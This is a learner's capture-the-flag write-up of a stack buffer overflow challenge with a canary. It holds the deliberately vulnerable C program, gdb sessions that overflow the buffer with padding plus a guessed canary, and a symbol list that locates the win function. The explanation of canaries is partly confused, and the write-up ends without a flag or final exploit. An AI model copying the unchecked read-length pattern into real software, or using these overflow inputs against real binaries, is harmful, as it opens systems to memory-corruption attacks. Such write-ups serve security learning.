# CTF Challenge: Buffer_Overflow_3

## Table of Content

- commands-executed:   checksec --file=vuln
- flag :


### Chain of thought / Learning:
- Okay so guessing by the name of the challenge its a buffer overflow exploit.
- on downloading the files and analyzing using **checksec --file=vuln** command we see that the function has canary protection.
- what is a canary? it is a protection mech against buffer overflow exploits and the way it works is it places a heap of memory between the return address and the buffer memory, when we perform a buffer exploit what we do is write till the return address to get the flag. When canary is enabled it is also overwritten the program performs a basic check that whether the canary is re written or wnot, if it is it crashes.
- so to handle this challenge there are 2 things i need to take care of finding out what is the canary(locally i can create a canary.txt and place my choice of string in it to do the overflow)
- second i need to actually do the overflow exploit.
- so locally i perform the buffer overflow first by creating a canary.txt and providing random input here its flag.
- analyzing the code, there are 2 specific variables i m focused on the canary variable and the buffer itself
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

- on analyzing with ghidra to find the diff in offset of these variables

![ghidra](https://github.com/user-attachments/assets/b29b4ba1-a11e-4941-80f6-0aff2a7aa220)

- we can see that the canary variable is at -0x14 and the buffer is at -0x54 which is 20 and 84 in decimal and the diff happens to be 64 exactly.
- after a lot of searches what my understnding is that the diff bw the buffer and the return address is 20 bytes.
- so now when i run the file and enter 64 bytes of data with a faulty canary it should crash and with the right one it should be fine

```console
How Many Bytes will You Write Into the Buffer?
> 72
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbbbbbb
Ok... Now Where's the Flag?
[Inferior 1 (process 38104) exited normally]
(gdb) 
(gdb) r
Starting program: /home/anonymous/investigation/vuln1 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 74
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbbbbflag    
***** Stack Smashing Detected ***** : Canary Value Corrupt!
[Inferior 1 (process 38193) exited normally]
(gdb) 
(gdb) r
Starting program: /home/anonymous/investigation/vuln1 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 73
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbbbbbbb
***** Stack Smashing Detected ***** : Canary Value Corrupt!
[Inferior 1 (process 38370) exited normally]
(gdb) 
(gdb) r
Starting program: /home/anonymous/investigation/vuln1 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 72
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbbbbbb
Ok... Now Where's the Flag?
[Inferior 1 (process 38459) exited normally]
(gdb) 
(gdb) r 
Starting program: /home/anonymous/investigation/vuln1 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 76 
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag
Ok... Now Where's the Flag?
[Inferior 1 (process 38956) exited normally]

```
- okay so for me the stack smashing occurs at 72 bytes of data after 72 i m writing over the canary text so it throws an error.
- as i said locally my canary is flag so if i enter the last 4 data after 72 as flag it should take work and it does.
- i have overflowed to the read canary function all i need to do is overflow to the win function
```console
Non-debugging symbols:
0x0000555555555000  _init
0x0000555555555030  puts@plt
0x0000555555555040  fread@plt
0x0000555555555050  fclose@plt
0x0000555555555060  setresgid@plt
0x0000555555555070  printf@plt
0x0000555555555080  read@plt
0x0000555555555090  memcmp@plt
0x00005555555550a0  fgets@plt
0x00005555555550b0  fflush@plt
0x00005555555550c0  __isoc99_sscanf@plt
0x00005555555550d0  getegid@plt
0x00005555555550e0  setvbuf@plt
0x00005555555550f0  fopen@plt
0x0000555555555100  exit@plt
0x0000555555555110  __cxa_finalize@plt
0x0000555555555120  _start
0x0000555555555150  deregister_tm_clones
0x0000555555555180  register_tm_clones
0x00005555555551c0  __do_global_dtors_aux
0x0000555555555200  frame_dummy
0x0000555555555209  win
0x00005555555552a9  read_canary
0x0000555555555345  vuln
0x0000555555555470  main
0x00005555555554d8  _fini
0x00007ffff7fcc1b0  _dl_signal_exception
0x00007ffff7fcc210  _dl_signal_error
0x00007ffff7fcc410  _dl_catch_exception
0x00007ffff7fcd510  _dl_debug_state
0x00007ffff7fce670  _dl_exception_create
0x00007ffff7fce740  _dl_exception_create_format
0x00007ffff7fcebb0  _dl_exception_free
0x00007ffff7fced40  __nptl_change_stack_perm
0x00007ffff7fd3eb0  _dl_rtld_di_serinfo
0x00007ffff7fd6970  _dl_find_dso_for_object
0x00007ffff7fd83c0  _dl_fatal_printf
0x00007ffff7fd8bb0  _dl_mcount

```


#### Output:
```console

```
